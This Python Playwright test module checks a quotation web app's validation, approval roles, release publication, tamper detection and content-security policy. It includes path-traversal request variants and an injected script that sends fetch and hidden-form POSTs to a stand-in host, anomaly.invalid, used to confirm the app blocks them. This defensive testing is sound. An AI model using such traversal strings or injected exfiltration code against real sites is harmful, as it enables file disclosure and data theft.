"""Live Chromium/HTTP checks for the frozen quotation anomaly recipes.

Fixtures are independently checked copies of genuine CLI output, supplied by the
parent runner. This module does not generate a substitute UI or edit product
code. Controlled hostile candidates exist only in the owned test workspace.
"""

from __future__ import annotations

import asyncio
import hashlib
import json
import shutil
from copy import deepcopy
from pathlib import Path
from urllib.parse import urljoin

from demopilot.quotation_browser import (
    FIELDS,
    OUTPUTS,
    _assert_snapshot,
    _set,
    audit_application,
    tree_hash,
)
from demopilot.quotation_contract import QuoteModel
from demopilot.quotation_release import ReleaseRejected


CASES = frozenset((*range(16, 26), *range(31, 36), 40))


def _write(path, value):
    Path(path).parent.mkdir(parents=True, exist_ok=True)
    Path(path).write_text(json.dumps(value, ensure_ascii=False, indent=2), "utf-8")


def _url(env, fixture, name="index.html"):
    return (
        urljoin(env.base_url.rstrip("/") + "/", fixture["url"]).rsplit("/", 1)[0]
        + "/"
        + name
    )


async def _dom(page):
    return await page.locator("body").evaluate(
        """(body, config) => ({url:location.href,
        outputs:Object.fromEntries(Object.entries(config.outputs).map(([k,id])=>[k,document.getElementById(id)?.innerText.trim()??null])),
        form:Object.fromEntries(Object.entries(config.fields).map(([k,id])=>[k,document.getElementById(id)?.value??null])),
        error:document.querySelector('#error')?.innerText??null,
        body:body.innerText.slice(0,16000)})""",
        dict(outputs=OUTPUTS, fields=FIELDS),
    )


async def _save_dom(page, output, name):
    result = await _dom(page)
    _write(Path(output) / (name + ".json"), result)
    await page.screenshot(path=str(Path(output) / (name + ".png")), full_page=True)
    return result


async def _step(page, model, op, trace, output):
    """Use visible controls, then compare independent committed state."""
    before = await _dom(page)
    for key in ("record", "role", "actor", "reason", "today"):
        if key in op:
            await _set(page, key, op[key])
    if op.get("action") == "calculate":
        record = op.get("record", model.record)
        values = dict(model.records[record]["values"], **op.get("values", {}))
        for key, value in values.items():
            if key == "manual_rate" and model.contract["workflow"] != "manual_override":
                continue
            if key == "shipping" and model.contract.get("version", 1) < 2:
                continue
            await _set(page, key, value)
    accepted = model.apply(op)
    action = op.get("action")
    clicked = False
    if action:
        button = page.locator("#" + action)
        if not await button.is_disabled():
            await button.click()
            clicked = True
    after = await _dom(page)
    row = dict(
        op=op,
        independent_operation_accepted=accepted,
        clicked=clicked,
        before=before,
        after=after,
    )
    trace.append(row)
    _write(Path(output) / "operations.json", trace)
    await _assert_snapshot(page, model.snapshot())
    return row


async def _invalid_feedback(page, field):
    # A browser-native invalid-input message is observable rejection feedback,
    # as is the application's visible #error. Neither is inferred from hashes.
    value = await page.locator("body").evaluate(
        """(body,id)=>{const input=document.getElementById(id),err=document.getElementById('error');
        return {application_error:err&&err.getClientRects().length?err.innerText.trim():'',
        native_message:input?.validationMessage??'',valid:input?.validity?.valid??true};}""",
        FIELDS.get(field, field),
    )
    assert value["application_error"] or (
        not value["valid"] and value["native_message"]
    ), value
    return value


async def _restore_record(page, model, expected_form):
    # Switching records rereads the committed values, rather than mistaking the
    # currently staged invalid input for the stored quotation.
    original = model.record
    other = "Q2" if original == "Q1" else "Q1"
    await _set(page, "record", other)
    await _set(page, "record", original)
    actual = await _dom(page)
    for key, expected in expected_form.items():
        assert actual["form"].get(key) == str(expected), (key, expected, actual["form"])
    await _assert_snapshot(page, model.snapshot())
    return actual


async def _quotation_case(n, env, details):
    workflow = {19: "manual_override", 22: "dual_manager", 24: "customer_owner"}.get(
        n, "single_manager"
    )
    fixture = await env.fixture(workflow=workflow)
    details["fixture"] = {
        k: fixture[k] for k in ("project", "revision", "digest", "url")
    }
    original_hash = tree_hash(fixture["source"])
    page = await env.fresh_page()
    trace = details["operations"] = []
    model = QuoteModel(fixture["contract"])
    try:
        response = await page.goto(_url(env, fixture), wait_until="load")
        details["http_status"] = response.status
        assert response.status == 200
        await _assert_snapshot(page, model.snapshot())
        await _save_dom(page, env.output, "before")

        async def step(op):
            return await _step(page, model, op, trace, env.output)

        async def submit():
            await step(dict(role="seller", actor="seller1", action="submit"))

        async def approve():
            await step(dict(role="manager", actor="manager1", action="approve"))

        await step(
            dict(
                role="seller",
                actor="seller1",
                action="calculate",
                values={"quantity": "5"},
            )
        )
        if n in (16, 17, 18):
            value = {16: "0", 17: "-2", 18: "1.5"}[n]
            committed = deepcopy(model.current["values"])
            await step(dict(action="calculate", values={"quantity": value}))
            details["rejection_feedback"] = await _invalid_feedback(page, "quantity")
            await _save_dom(page, env.output, "rejected-input")
            details["committed_reread"] = await _restore_record(
                page, model, {"quantity": committed["quantity"]}
            )
        elif n == 19:
            await submit()
            await approve()
            for index, value in enumerate(("0", "-2")):
                await step(
                    dict(
                        role="seller",
                        actor="seller1",
                        action="calculate",
                        values={"manual_rate": value},
                    )
                )
                details.setdefault("rejection_feedback", []).append(
                    await _invalid_feedback(page, "manual_rate")
                )
                await _save_dom(page, env.output, f"nonpositive-price-{index}")
                await _restore_record(page, model, {"manual_rate": "", "quantity": "5"})
        elif n == 20:
            stable = model.snapshot()
            for _ in range(3):
                await step(dict(action="calculate"))
                assert model.snapshot() == stable
        elif n == 21:
            await submit()
            await step(dict(role="finance", actor="finance1", action="approve"))
        elif n == 22:
            await submit()
            await approve()
            assert model.current["state"] == "PendingManager"
            await step(dict(action="approve"))
            assert model.current["state"] == "PendingManager"
            await step(dict(actor="manager2", action="approve"))
            assert model.current["state"] == "Approved"
        elif n == 23:
            await step(dict(role="customer", actor="client1", action="accept"))
            await submit()
            await step(dict(role="customer", actor="client1", action="accept"))
        elif n == 24:
            await submit()
            await approve()
            await step(dict(role="customer", actor="intruder", action="accept"))
            await step(dict(actor="client1", action="accept"))
            assert model.current["state"] == "Accepted"
        elif n == 25:
            await submit()
            await approve()
            await step(
                dict(
                    role="seller",
                    actor="seller1",
                    action="calculate",
                    values={"quantity": "6"},
                )
            )
            assert (
                model.current["state"] == "Draft"
                and model.current["approved_revision"] == -1
            )
            await step(dict(role="customer", actor="client1", action="accept"))
            await submit()
            await approve()
            await step(dict(role="customer", actor="client1", action="accept"))
        details["protected_values_preserved"] = True
    finally:
        details["fixture_source_unchanged"] = (
            tree_hash(fixture["source"]) == original_hash
        )
        try:
            details["final_dom"] = await _save_dom(page, env.output, "after")
        finally:
            await page.context.close()
    assert details["fixture_source_unchanged"]


async def _get(env, url, details):
    response = await env.client.get(url)
    row = dict(
        url=str(response.url),
        status=response.status_code,
        sha256=hashlib.sha256(response.content).hexdigest(),
        body=response.text[:1200] if response.status_code != 200 else None,
    )
    details.setdefault("http", []).append(row)
    return response


async def _new_revision(env, fixture, *, distinct=False):
    """Publish a re-audited owned copy through the real registry."""
    source = Path(env.output) / "revision-2-candidate"
    shutil.copytree(fixture["source"], source)
    if distinct:
        with (source / "app.js").open("a", encoding="utf-8") as stream:
            stream.write(
                "\n// Controlled revision-two asset identity for pinned-resource acceptance.\n"
            )
        with (source / "styles.css").open("a", encoding="utf-8") as stream:
            stream.write("\n/* Controlled revision-two style identity. */\n")
    contract = deepcopy(fixture["contract"])
    report = await audit_application(
        source, contract, Path(env.output) / "revision-2-audit", private=True
    )
    assert report["status"] == "passed", report.get("issues")
    registry = env.manager.registry
    project, revision = fixture["project"], fixture["revision"] + 1
    registry.set_intent(project, revision, contract)
    lease = registry.claim(project, revision, project + f"-anomaly-v{revision}")
    digest = tree_hash(source)
    check = registry.record_check(lease["id"], lease["token"], digest, report)
    release = registry.publish(lease["id"], lease["token"], check, source)
    url = f"/api/sales-core/accepted/{project}/{revision}/{digest}/index.html"
    return dict(
        source=source,
        contract=contract,
        report=report,
        release=release,
        lease=lease,
        token=lease["token"],
        check_id=check,
        project=project,
        revision=revision,
        digest=digest,
        url=url,
    )


async def _publication_case(n, env, details):
    fixture = await env.fixture()
    details["fixture"] = {
        k: fixture[k] for k in ("project", "revision", "digest", "url")
    }
    registry = env.manager.registry
    source_hash = tree_hash(fixture["source"])
    registry_before = registry.snapshot()
    page = await env.fresh_page()
    try:
        if n == 31:
            hidden = dict(fixture, revision=fixture["revision"] + 1000, digest="0" * 64)
            hidden["url"] = (
                f"/api/sales-core/accepted/{hidden['project']}/{hidden['revision']}/{hidden['digest']}/index.html"
            )
            url = _url(env, hidden)
            http = await _get(env, url, details)
            response = await page.goto(url, wait_until="load")
            details["browser_status"] = response.status
            details["browser_dom"] = await _save_dom(page, env.output, "unaccepted")
            assert http.status_code in (404, 409) and response.status in (404, 409)
            assert b'id="calculate"' not in http.content
            assert registry.snapshot() == registry_before
        elif n == 32:
            await page.goto(_url(env, fixture), wait_until="load")
            await _save_dom(page, env.output, "before")
            accepted = registry.artifacts / fixture["digest"]
            target = accepted / "app.js"
            assert target.resolve().is_relative_to(registry.artifacts.resolve())
            original = target.read_bytes()
            try:
                target.write_bytes(original + b"\n// controlled owned-copy tampering\n")
                for name in ("index.html", "app.js"):
                    response = await _get(env, _url(env, fixture, name), details)
                    assert response.status_code in (404, 409), details["http"][-1]
                response = await page.reload(wait_until="load")
                details["browser_status"] = response.status
                await _save_dom(page, env.output, "tamper-refused")
                assert response.status in (404, 409)
            finally:
                target.write_bytes(original)
            assert tree_hash(accepted) == fixture["digest"]
            details["tampered_copy_restored"] = True
        elif n == 33:
            # A genuine older accepted event arrives after a newer confirmed
            # revision. The real manager must ignore it, and the registry must
            # reject any late attempt to reinstall the old release pointer.
            newer = await _new_revision(env, fixture, distinct=True)
            current = registry.resolve(fixture["project"])
            assert current["revision"] == newer["revision"]
            try:
                session = env.manager.store.get(fixture["project"])
            except KeyError:
                session = dict(
                    id=fixture["project"],
                    title="Controlled stale publication",
                    status="published",
                    revision=newer["revision"],
                    versions=[],
                    events=[],
                    messages=[],
                    demo_url=newer["url"],
                )
            session.update(
                revision=newer["revision"], status="published", demo_url=newer["url"]
            )
            env.manager.store.save(session)
            before = env.manager.store.get(fixture["project"])
            env.manager._core_event(
                fixture["project"],
                fixture["revision"],
                dict(kind="published", release=fixture["release"]),
            )
            after = env.manager.store.get(fixture["project"])
            details["old_completion_ignored"] = before == after
            try:
                lease = fixture.get("lease") or fixture["job"]
                if isinstance(lease, str):
                    job_id, token = lease, fixture["token"]
                else:
                    job_id, token = lease["id"], lease["token"]
                registry.publish(job_id, token, fixture["check_id"], fixture["source"])
            except ReleaseRejected as exc:
                details["old_publish_rejected"] = str(exc)
            else:
                raise AssertionError("Stale revision unexpectedly republished")
            assert details["old_completion_ignored"]
            assert registry.resolve(fixture["project"])["artifact"] == newer["digest"]
            response = await page.goto(_url(env, newer), wait_until="load")
            assert response.status == 200
            await _assert_snapshot(page, QuoteModel(newer["contract"]).snapshot())
            details["current_url"] = newer["url"]
            await _save_dom(page, env.output, "current-revision")
        elif n == 34:
            # Marker contains no user data, and is deliberately outside bundle.
            marker = registry.artifacts / "anomaly-outside-bundle.txt"
            marker_bytes = b"ANOMALY_OUTSIDE_BUNDLE_NOT_SERVABLE_34"
            assert not marker.exists(), "Test marker already exists; refusing overwrite"
            marker.write_bytes(marker_bytes)
            base = _url(env, fixture).rsplit("/", 1)[0] + "/"
            variants = (
                "../anomaly-outside-bundle.txt",
                "%2e%2e%2fanomaly-outside-bundle.txt",
                "%2e%2e/anomaly-outside-bundle.txt",
                "..%5canomaly-outside-bundle.txt",
                "%252e%252e%252fanomaly-outside-bundle.txt",
            )
            try:
                for index, suffix in enumerate(variants):
                    response = await _get(env, base + suffix, details)
                    browser_response = await page.goto(base + suffix, wait_until="load")
                    browser_body = await page.locator("body").inner_text()
                    details.setdefault("browser_variants", []).append(
                        dict(
                            suffix=suffix,
                            status=browser_response.status,
                            body=browser_body[:1000],
                        )
                    )
                    await _save_dom(page, env.output, f"traversal-{index}")
                    assert response.status_code in (404, 409)
                    assert browser_response.status in (404, 409)
                    assert (
                        marker_bytes not in response.content
                        and marker_bytes.decode() not in browser_body
                    )
                assert marker.read_bytes() == marker_bytes
            finally:
                marker.unlink()
        elif n == 35:
            released = asyncio.Event()
            seen = {"app.js": asyncio.Event(), "styles.css": asyncio.Event()}
            observed = {}

            async def hold(route):
                name = route.request.url.rsplit("/", 1)[-1]
                seen[name].set()
                await released.wait()
                await route.continue_()

            async def received(response):
                name = response.url.rsplit("/", 1)[-1]
                if (
                    response.url.startswith(_url(env, fixture).rsplit("/", 1)[0] + "/")
                    and name in seen
                ):
                    observed[name] = dict(
                        url=response.url,
                        status=response.status,
                        sha256=hashlib.sha256(await response.body()).hexdigest(),
                    )

            page.on("response", received)
            await page.route("**/app.js", hold)
            await page.route("**/styles.css", hold)
            navigation = asyncio.create_task(
                page.goto(_url(env, fixture), wait_until="load", timeout=60000)
            )
            try:
                await asyncio.wait_for(
                    asyncio.gather(*(event.wait() for event in seen.values())), 8
                )
                details["v1_asset_requests_waiting_before_v2"] = True
                newer = await _new_revision(env, fixture, distinct=True)
                assert newer["digest"] != fixture["digest"]
            finally:
                released.set()
            response = await navigation
            assert response.status == 200
            await _assert_snapshot(page, QuoteModel(fixture["contract"]).snapshot())
            for name in seen:
                expected = hashlib.sha256(
                    (Path(fixture["source"]) / name).read_bytes()
                ).hexdigest()
                actual = await _get(env, _url(env, fixture, name), details)
                assert (
                    actual.status_code == 200
                    and hashlib.sha256(actual.content).hexdigest() == expected
                )
                assert (
                    name in observed
                    and observed[name]["status"] == 200
                    and observed[name]["sha256"] == expected
                ), observed
                assert (
                    expected
                    != hashlib.sha256(
                        (Path(newer["source"]) / name).read_bytes()
                    ).hexdigest()
                )
            details["browser_asset_responses"] = observed
            await _save_dom(page, env.output, "v1-still-pinned-after-v2")
        details["protected_values_preserved"] = True
    finally:
        details["fixture_source_unchanged"] = (
            tree_hash(fixture["source"]) == source_hash
        )
        details["registry_after"] = registry.snapshot()
        await page.context.close()
    assert details["fixture_source_unchanged"]


async def _external_case(env, details):
    fixture = await env.fixture()
    original_hash = tree_hash(fixture["source"])
    source = Path(env.output) / "external-request-candidate"
    shutil.copytree(fixture["source"], source)
    # Deliberately catch a blocked fetch, and target form submission at a hidden
    # frame so navigation failure cannot accidentally stand in for detection.
    injection = """
// Controlled anomaly40 fault injection. No real destination or real quote.
fetch('https://anomaly.invalid/quotation',{method:'POST',body:'controlled-anomaly40'}).catch(()=>{});
const anomalyFrame=document.createElement('iframe');anomalyFrame.name='anomaly40-frame';anomalyFrame.hidden=true;document.body.append(anomalyFrame);
const anomalyForm=document.createElement('form');anomalyForm.method='POST';anomalyForm.action='https://anomaly.invalid/submit';anomalyForm.target='anomaly40-frame';anomalyForm.hidden=true;document.body.append(anomalyForm);anomalyForm.submit();
"""
    with (source / "app.js").open("a", encoding="utf-8") as stream:
        stream.write(injection)
    report = await audit_application(
        source,
        fixture["contract"],
        Path(env.output) / "hostile-candidate-audit",
        private=True,
    )
    details["unsafe_candidate_audit"] = dict(
        status=report["status"],
        source_sha256=report["source_sha256"],
        planned=report["planned_journeys"],
        executed=report["executed_journeys"],
        passed=report["passed_journeys"],
        issues=report.get("issues", []),
    )
    registry = env.manager.registry
    project = __import__("uuid").uuid4().hex[:16]
    registry.set_intent(project, 1, fixture["contract"])
    lease = registry.claim(project, 1, project + "-anomaly40")
    digest = tree_hash(source)
    check = registry.record_check(lease["id"], lease["token"], digest, report)
    try:
        release = registry.publish(lease["id"], lease["token"], check, source)
        details["unsafe_candidate_published"] = release
    except ReleaseRejected as exc:
        details["unsafe_candidate_publish_rejected"] = str(exc)
    accepted_url = f"{env.base_url.rstrip('/')}/api/sales-core/accepted/{project}/1/{digest}/index.html"
    response = await _get(env, accepted_url, details)
    # A test-only candidate route uses the actual production response CSP. It
    # grants no acceptance or publication. Also probe a real accepted endpoint.
    candidate_url = await env.candidate_url(source)
    page = await env.fresh_page()
    outside_routes = []
    page_errors = []
    page.on("pageerror", lambda error: page_errors.append(str(error)))
    await page.add_init_script(
        "window.__anomalyCsp=[];document.addEventListener('securitypolicyviolation',e=>window.__anomalyCsp.push({directive:e.effectiveDirective,blockedURI:e.blockedURI}));"
    )

    async def block(route):
        outside_routes.append(dict(url=route.request.url, method=route.request.method))
        await route.abort()

    await page.route("https://anomaly.invalid/**", block)
    try:
        candidate_response = await page.goto(
            urljoin(env.base_url + "/", candidate_url), wait_until="load"
        )
        await page.wait_for_timeout(150)
        details["candidate_browser"] = dict(
            status=candidate_response.status,
            csp=candidate_response.headers.get("content-security-policy"),
            violations=await page.evaluate("window.__anomalyCsp"),
            backup_route_blocks=list(outside_routes),
            actual_dom=await _save_dom(page, env.output, "hostile-candidate-csp"),
        )
        outside_routes.clear()
        response_ok = await page.goto(_url(env, fixture), wait_until="load")
        # Browser-only fault injection checks the header enforced on a real
        # accepted URL; it does not modify the accepted artifact on disk.
        await _assert_snapshot(page, QuoteModel(fixture["contract"]).snapshot())
        await page.evaluate("""()=>{fetch('https://anomaly.invalid/accepted-probe').catch(()=>{});
        const frame=document.createElement('iframe');frame.name='accepted-anomaly40-frame';frame.hidden=true;document.body.append(frame);
        const f=document.createElement('form');f.action='https://anomaly.invalid/accepted-form';f.method='POST';f.target='accepted-anomaly40-frame';f.hidden=true;document.body.append(f);f.submit();}""")
        await page.wait_for_timeout(150)
        violations = await page.evaluate("window.__anomalyCsp")
        details["accepted_browser"] = dict(
            status=response_ok.status,
            csp=response_ok.headers.get("content-security-policy"),
            violations=violations,
            backup_route_blocks=list(outside_routes),
            actual_dom=await _save_dom(page, env.output, "accepted-csp-probe"),
        )
        await _assert_snapshot(page, QuoteModel(fixture["contract"]).snapshot())
        details["protected_values_preserved"] = True
        details["no_external_destination_contacted"] = True
        details["scope"] = (
            "Controlled fault injection on owned real CLI output; candidate route is test-only, accepted route is production. Route backup and CSP are reported separately."
        )
        issues = []
        if report["status"] != "failed":
            issues.append(
                "Trusted audit accepted generated external fetch/form attempts"
            )
        if "unsafe_candidate_published" in details or response.status_code not in (
            404,
            409,
        ):
            issues.append(
                "Unsafe candidate was publishable instead of remaining hidden"
            )
        directives = {entry["directive"] for entry in violations}
        if not {"connect-src", "form-action"}.issubset(directives):
            issues.append(
                "Production accepted URL lacks observed CSP blocking for fetch and form"
            )
        if outside_routes:
            issues.append(
                "Backup browser route, not production CSP alone, blocked outgoing requests"
            )
        details["issues"] = issues
        assert not issues, "; ".join(issues)
    finally:
        details["fixture_source_unchanged"] = (
            tree_hash(fixture["source"]) == original_hash
        )
        await page.context.close()
    assert details["fixture_source_unchanged"]


async def run_case(n, env):
    """Run one frozen recipe; persist observations even when it fails.

    Required env: manager, client (real HTTP), browser, output, base_url;
    async fixture(), fresh_page(), candidate_url(source). Fixture includes the
    genuine copied source and actual public audit report plus lease metadata.
    No model calls are made here; the parent accounts for artifact provenance.
    """
    n = int(n)
    if n not in CASES:
        raise ValueError(f"Browser module does not own anomaly {n}")
    Path(env.output).mkdir(parents=True, exist_ok=True)
    details = dict(
        case=f"sales-v3-anomaly-{n:02}", execution="actual HTTP and Chromium"
    )
    try:
        if 16 <= n <= 25:
            await _quotation_case(n, env, details)
        elif 31 <= n <= 35:
            await _publication_case(n, env, details)
        else:
            await _external_case(env, details)
        details["passed"] = True
        return details
    except BaseException as exc:
        details.update(
            passed=False, error=dict(type=type(exc).__name__, message=str(exc))
        )
        raise
    finally:
        _write(Path(env.output) / "browser-case-evidence.json", details)
